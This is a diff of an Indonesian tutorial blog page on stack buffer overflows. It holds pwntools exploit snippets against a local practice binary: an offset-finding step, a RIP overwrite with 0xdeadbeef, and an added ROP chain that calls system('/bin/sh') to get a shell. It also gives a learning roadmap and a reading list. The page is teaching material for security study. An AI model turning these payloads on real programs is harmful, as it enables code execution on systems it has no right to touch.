-<pre tabindex="0"><code>Offset ke return address: 18
-</code></pre><p><strong>Penjelasan:</strong></p>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># 1. Crash program &amp; cari offset</span>
+</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">76</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># 2. ROP Chain</span>
+</span></span><span style="display:flex;"><span>rop = ROP(elf)
+</span></span><span style="display:flex;"><span>rop.call(elf.sym.system, [next(elf.search(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;/bin/sh&#39;</span>))])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># 3. Bangun payload</span>
+</span></span><span style="display:flex;"><span>payload = flat({
+</span></span><span style="display:flex;"><span>    offset: rop.chain()
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># 4. Kirim exploit</span>
+</span></span><span style="display:flex;"><span>io = process(elf.path)
+</span></span><span style="display:flex;"><span>io.sendline(payload)
+</span></span><span style="display:flex;"><span>io.interactive()
+</span></span></code></pre></div><hr>
+<h2 id="mengapa-masih-relevan-mempelajari-stack-overflow"><strong>Mengapa Masih Relevan Mempelajari Stack Overflow?</strong></h2>
+<h3 id="1-fundamental-keamanan-memori"><strong>1. Fundamental Keamanan Memori</strong></h3>
 <ul>
-<li><code>cyclic(50)</code> membuat pattern seperti <code>aaaabaaacaaadaaa...</code></li>
-<li>Ketika program crash, kita cari bagian pattern yang mengisi RIP</li>
-<li><code>cyclic_find</code> menghitung berapa byte sampai ke titik itu</li>
+<li>Memahami konsep memory corruption</li>
+<li>Prinsip kontrol flow execution</li>
+</ul>
+<h3 id="2-dasar-untuk-teknik-lanjutan"><strong>2. Dasar untuk Teknik Lanjutan</strong></h3>
+<ul>
+<li>SEH overwrite pada Windows</li>
+<li>Heap exploitation modern</li>
+<li>Kernel space exploitation</li>
+</ul>
+<h3 id="3-aplikasi-di-sistem-legacy"><strong>3. Aplikasi di Sistem Legacy</strong></h3>
+<ul>
+<li>Embedded systems</li>
+<li>IoT devices</li>
+<li>Industrial control systems</li>
 </ul>
 <hr>
-<h2 id="-6-membuat-proof-of-concept-exploit">🚀 6. Membuat Proof-of-Concept Exploit</h2>
-<p>Setelah tahu offset, kita bisa kontrol RIP. Contoh script exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>binary = <span style="color:#87ceeb">&#34;./vuln&#34;</span>
-</span></span><span style="display:flex;"><span>p = process(binary)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">18</span>
-</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;A&#34;</span>*offset + p64(<span style="color:#f60">0xdeadbeef</span>)  <span style="color:#0f0"># Isi RIP dengan 0xdeadbeef</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>p.interactive()
-</span></span></code></pre></div><p><strong>Hasil yang Diharapkan:</strong></p>
-<pre tabindex="0"><code>$ python3 exploit.py
-[+] Starting local process &#39;./vuln&#39;: pid 1234
-[*] Switching to interactive mode
-Input: You entered: AAAAAAAAAAAAAAAAAA�
-[*] Got EOF while reading in interactive
-[!] Process &#39;./vuln&#39; crashed with signal SIGSEGV
-</code></pre><p>Cek di GDB, register RIP sekarang bernilai <code>0xdeadbeef</code>!</p>
-<hr>
-<h2 id="-7-roadmap-belajar-pwn-fundamental">📈 7. Roadmap Belajar PWN Fundamental</h2>
-<p>Berikut alur belajar yang saya rekomendasikan:</p>
+<h2 id="sumber-belajar-lebih-lanjut"><strong>Sumber Belajar Lebih Lanjut</strong></h2>
 <ol>
-<li>
-<p><strong>Memory Layout</strong>:</p>
+<li><strong>Buku</strong>:
 <ul>
-<li>Stack, heap, data segment</li>
-<li>Cara program menggunakan memory</li>
+<li>&ldquo;The Shellcoder&rsquo;s Handbook&rdquo; (Chris Anley)</li>
+<li>&ldquo;Hacking: The Art of Exploitation&rdquo; (Jon Erickson)</li>
 </ul>
 </li>
-<li>
-<p><strong>Buffer Overflow Dasar</strong>:</p>
+<li><strong>CTF Challenges</strong>:
 <ul>
-<li>Seperti yang kita lakukan di tutorial ini</li>
-<li>Memahami konsep stack frame</li>
+<li>picoCTF</li>
+<li>OverTheWire</li>
+<li>Hack The Box</li>
 </ul>
 </li>
-<li>
-<p><strong>Redirection Control Flow</strong>:</p>
+<li><strong>Paper Penelitian</strong>:
 <ul>
-<li>Arahkan return address ke fungsi <code>win()</code> dalam binary</li>
-<li>Contoh: <code>payload = b&quot;A&quot;*offset + p64(0x401152)</code></li>
-</ul>
-</li>
-<li>
-<p><strong>Return-Oriented Programming (ROP)</strong>:</p>
-<ul>
-<li>Bypass NX dengan ROP chain</li>
-<li>Gabungkan gadget-gadget yang ada</li>
-</ul>
-</li>
-<li>
-<p><strong>Format String Exploit</strong>:</p>
-<ul>
-<li>Baca/tulis arbitrary memory</li>
-<li>Eksploitasi bug <code>printf</code></li>
+<li>&ldquo;Smashing The Stack For Fun And Profit&rdquo; (Aleph One)</li>
+<li>&ldquo;Return-Oriented Programming&rdquo; (Hovav Shacham)</li>
 </ul>
 </li>
 </ol>
-<hr>
-<h2 id="-tantangan-selanjutnya">🔜 Tantangan Selanjutnya</h2>
-<p>Mau lanjut ke level lebih advanced? Coba ini:</p>
-<ol>
-<li>Tambahkan fungsi <code>win()</code> yang print flag</li>
-<li>Eksploitasi untuk redirect eksekusi ke <code>win()</code></li>
-<li>Bypass NX dengan ROP untuk spawn shell</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Bersiaplah untuk tutorial part 2 dimana kita akan membahas:</p>
-<ul>
-<li>Membuat shellcode custom</li>
-<li>Teknik Return-Oriented Programming (ROP)</li>
-<li>Bypass mitigasi modern</li>
-</ul>
-<hr>
-<h2 id="-referensi-tambahan">📚 Referensi Tambahan</h2>
-<ul>
-<li><a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">LiveOverflow Binary Hacking Playlist</a></li>
-<li><a href="https://ctf101.org/binary-exploitation/overview/">CTF 101: Binary Exploitation</a></li>
-<li><a href="https://docs.pwntools.com/en/stable/">pwntools Documentation</a></li>
-</ul>
-<pre tabindex="0"><code>
-Tips untuk pembaca:
-1. Coba setiap step sendiri di virtual machine
-2. Ubah-ubah nilai dan lihat efeknya
-3. Gunakan GDB untuk inspect memory setelah crash
-4. Dokumentasikan setiap progress belajar kalian!
-</code></pre>
+<p>Dengan pemahaman mendalam tentang binary exploitation dan buffer overflow, Anda memiliki landasan kuat untuk menjelajahi dunia exploit development yang lebih advanced. Selamat belajar! 🚀</p>
+
 </article>
 
 <hr>
